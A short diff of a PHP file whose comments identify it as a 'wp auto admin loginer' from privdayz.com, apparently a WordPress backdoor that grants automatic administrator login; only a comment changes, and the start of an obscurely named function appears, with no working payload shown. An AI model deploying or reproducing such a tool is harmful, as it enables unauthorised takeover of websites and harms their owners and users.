@@ -1,5 +1,5 @@
 <?php
-// privdayz.com | wp auto admin loginer
+// privdayz.com v1 | wp auto admin loginer
 // github.com/privdayzcom/wp-auto-admin-loginer
 header('Content-Type: text/html; charset=UTF-8');
 function jdk2g1d($r = null, $q = 0) {
